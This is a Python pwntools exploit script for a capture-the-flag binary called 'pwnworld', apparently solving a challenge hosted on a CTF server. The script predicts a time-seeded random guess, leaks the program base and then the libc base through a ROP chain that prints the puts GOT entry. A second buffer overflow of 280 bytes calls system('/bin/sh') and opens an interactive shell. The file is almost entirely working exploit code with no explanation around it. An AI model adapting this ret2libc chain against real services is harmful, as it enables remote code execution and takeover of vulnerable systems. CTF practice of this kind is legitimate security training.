#!/usr/bin/env python3

from pwn import *
import ctypes

exe = ELF("./pwnworld_patched",checksec=False)
libc = ELF("./libc.so.6",checksec=False)
ld = ELF("./ld-2.37.so",checksec=False)
pop_rdi = 0x00000000000012b5
context.binary = exe

context.log_level = "warning"


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("ctf-gemastik.ub.ac.id", 10012 )

    return r


def main():
    r = conn()
    LIBC = ctypes.CDLL("/lib/x86_64-linux-gnu/libc.so.6") 
    LIBC.srand(LIBC.time(0))
    guess = LIBC.rand() % 417
    r.sendlineafter(b"guess? ", str(guess).encode())
    r.recvuntil(b"you: ")

    gift = eval(r.recvline(0))
    exe.address = gift - exe.sym.gift
    #print(hex(exe.address))
    
    payload = b'a'*280
    payload += p64(exe.address + pop_rdi)
    payload += p64(exe.got.puts)
    payload += p64(exe.sym.puts) + p64(exe.sym.main)

    r.sendline(payload)

    r.recvuntil(b"yaa\n")

    libc.address = u64(r.recvn(6) + b"\x00"*2) - libc.sym.puts

    #print(hex(libc.address))
    
    LIBC = ctypes.CDLL("/lib/x86_64-linux-gnu/libc.so.6") 
    LIBC.srand(LIBC.time(0))
    guess = LIBC.rand() % 417
    r.sendlineafter(b"guess? ", str(guess).encode())

    payload = b'a'*280
    payload += p64(exe.address + pop_rdi)
    payload += p64(next(libc.search(b"/bin/sh\x00")))
    payload += p64(exe.address + pop_rdi+1)
    payload += p64(libc.sym.system) 

    r.sendline(payload)

    r.recvuntil(b"yaa\n")
    r.interactive()


if __name__ == "__main__":
    main()
